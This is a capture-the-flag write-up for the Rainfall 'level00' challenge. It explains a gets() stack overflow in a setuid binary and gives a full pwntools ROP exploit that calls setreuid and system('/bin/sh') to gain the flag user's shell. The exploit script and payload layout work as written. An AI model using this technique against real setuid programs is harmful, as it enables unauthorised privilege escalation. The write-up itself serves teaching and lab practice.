# Level00 — case

## Initial checks

We use these checks at the start of every challenge, to see what protections the binary has and who owns it.

```
level00@rainfall:~$ pwn checksec ./case
[*] '/home/level00/case'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

What matters here:
- **No canary found**: nothing stops us from overwriting the return address, no need to leak/replay a canary.
- **No PIE (0x400000)**: the binary's own code and data are loaded at the same fixed address every run. We don't need to leak anything to know where the binary itself lives.
- **Partial RELRO**: not directly relevant to this exploit (we're not touching the GOT here), but good to always note.

```
level00@rainfall:~$ ldd ./case
        linux-vdso.so.1 (0x00007ffff7fc3000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
```

`ldd` shows us which `libc` the binary links against and where it's loaded.

```
level00@rainfall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

This confirms ASLR is disabled system-wide on this machine. That means the `libc` base address `ldd` just showed us (`0x7ffff7c00000`) will be **the same on every run**, including inside our own exploit process. Without this, the libc address we see from `ldd` wouldn't reliably match the address the vulnerable `setuid` binary sees at runtime.

```
level00@rainfall:~$ file ./case
./case: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cf829b6d2e267f5bcc21704565a08b69c78122d1, for GNU/Linux 3.2.0, not stripped
level00@rainfall:~$ ls -lh ./case
-rwsr-x--- 1 flag00 level00 17K Jun  9 23:13 ./case
```

The `s` in `-rwsr-x---` is the setuid bit: owned by `flag00`, and runs with `flag00`'s privileges no matter who executes it.

```
level00@rainfall:~$ id flag00
uid=1017(flag00) gid=1019(flag00) groups=1019(flag00),1002(flaggroup)
```

This gives us the exact uid we need to become: **1017**.

## The vulnerability

`auth_loop()` declares a 64-byte local buffer:

```c
char credentials[64];
...
gets(credentials);
```

`gets()` reads a line from `stdin` and writes it into `credentials` with **no length limit at all**. It keeps writing bytes until it reads a newline or `EOF`, regardless of how big the destination buffer is. Since `credentials` lives on the stack, writing more than 64 bytes starts overwriting whatever else is on the stack above it: the compiler's padding, the saved `RBP`, and finally the saved return address (`RIP`) that `auth_loop()` will jump to once it returns.

Because we control every byte we send, we control every byte written past the buffer, including the return address itself. This is the textbook stack buffer overflow: we don't need to find a logic bug in the authentication check, we just need to overwrite the return address before `verify_credentials()` is ever reached.

## Finding the offset to the return address

We need to know exactly how many bytes separate the start of `credentials` from the saved return address. We generate a cyclic pattern and crash the binary with it:

```
level00@rainfall:~$ pwn cyclic 200 > /tmp/pattern
level00@rainfall:~$ gdb -nx ./case
(gdb) run < /tmp/pattern
...
Program received signal SIGSEGV, Segmentation fault.
0x6161616c61616161 in ?? ()
```

`RIP` got overwritten with an 8-byte chunk from the pattern. `pwn cyclic -l` tells us where that chunk sits in the pattern:

```
level00@rainfall:~$ pwn cyclic -l 0x6161616c61616161
88
```

So the first 88 bytes of our payload can be anything (they cover `credentials[64]` plus 16 bytes of alignment padding plus the 8-byte saved `RBP`), and byte 89 onward lands directly in the saved `RIP` slot.

## Choosing the target: libc gadgets

We want the hijacked return address to run code that elevates our privileges and spawns a shell, not our own code (there's no NX bypass needed since we're reusing existing code in `libc`, not injecting new instructions).

We need:
- `setreuid(1017, 1017)` to set both our real and effective UID to `flag00`'s UID, so the shell we spawn next doesn't drop back down to our normal user.
- `system("/bin/sh")` to get a shell.

To call these with the right arguments, we need small snippets of existing code ("gadgets") already present in `libc` that pop values into the right registers. `ropper` finds these for us:

```
level00@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret"
level00@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rsi; pop r15; ret"
level00@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "ret"
```

These give us:
- a `pop rdi ; ret` gadget, to control the 1st argument of a function call (`rdi`),
- a `pop rsi ; pop r15 ; ret` gadget, to control the 2nd argument (`rsi`, with `r15` as unavoidable filler),
- a bare `ret` gadget, used purely for 16-byte stack alignment before calling a `libc` function that uses SSE instructions internally (glibc's internal calling convention expects `RSP % 16 == 8` at the function's entry; skipping this can cause a crash inside `libc` on a `movaps` instruction).

Since ASLR is off, we can find each gadget's **offset from the libc base** once (with `ropper` or `objdump`) and reuse that offset forever: `gadget_address = libc_base + offset`.

## Manual exploitation walkthrough

First, we confirm the crash with no real target yet, just to prove we land exactly on the return address:

```
level00@rainfall:~$ python3 -c "print('A'*88 + 'B'*8)" | ./case
```

This crashes trying to execute `0x4242424242424242` ("BBBBBBBB"), confirming the 88-byte offset.

Then we replace the `'B'*8` with our chain, one call at a time, right after the padding:

```
payload = b'A' * 88
payload += p64(pop_rdi)       # pop rdi ; ret
payload += p64(1017)          # -> rdi = 1017 (new ruid)
payload += p64(pop_rsi)       # pop rsi ; pop r15 ; ret
payload += p64(1017)          # -> rsi = 1017 (new euid)
payload += p64(0)             # -> r15 = junk, doesn't matter
payload += p64(setreuid_addr) # setreuid(1017, 1017)
payload += p64(ret_gadget)    # extra ret, fixes 16-byte alignment
payload += p64(pop_rdi)       # pop rdi ; ret
payload += p64(binsh_addr)    # -> rdi = address of "/bin/sh"
payload += p64(system_addr)   # system("/bin/sh")
```

We send it with stdin kept open, so the shell `system()` spawns can read further commands from us instead of hitting EOF immediately:

```
level00@rainfall:~$ (python3 -c "..." ; cat) | ./case
$ id
uid=1017(flag00) gid=1019(flag00) groups=1019(flag00),1002(flaggroup)
```

The `exploit.py` below does exactly this, just assembled into one script.

## Stack layout during the overflow

```text
high address in memory:
+-----------------------+
|    ROP chain          |
+-----------------------+
|     saved RIP         |   <-- overwritten
+-----------------------+
| saved RBP             |
+-----------------------+
| stack padding         |
+-----------------------+
| credentials[64]       |
+-----------------------+
low address in memory
```

Our 88 bytes of filler cover `credentials[64]` + the padding + the saved `RBP`. Everything after that, we control precisely: first the saved `RIP` (redirected to our first gadget), then the ROP chain itself, each gadget's own `ret` consuming the next 8-byte entry as if it were a real return address.

## Exploit script

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
context.log_level = 'error'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000

FLAG00 = 1017
OFFSET = 88

system   = libc.symbols['system']
setreuid = libc.symbols['setreuid']
binsh    = next(libc.search(b'/bin/sh'))

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

ret = rop.raw(rop.ret)

payload = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(FLAG00)
payload += p64(pop_rsi)
payload += p64(FLAG00)
payload += p64(FLAG00)
payload += p64(setreuid)
payload += p64(rop.ret[0])
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sys.stdout.buffer.write(payload)
```

## Running it

```
(python3 exploit.py ; cat) | ./case
```